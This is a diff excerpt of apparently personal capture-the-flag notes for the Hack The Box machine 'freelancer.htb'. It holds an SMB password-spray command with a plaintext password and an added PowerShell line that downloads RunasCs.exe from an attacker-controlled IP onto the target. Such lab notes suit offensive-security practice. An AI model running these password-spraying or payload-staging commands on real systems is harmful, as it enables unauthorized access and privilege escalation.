@@ -67,3 +67,9 @@ get-aduser -filter * | select samaccountname
 
 netexec smb freelancer.htb -u users -p "IL0v3ErenY3ager" --continue-on-success
 ==========(9)======================================================================================================================
+target:
+iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe
+
+
+
+
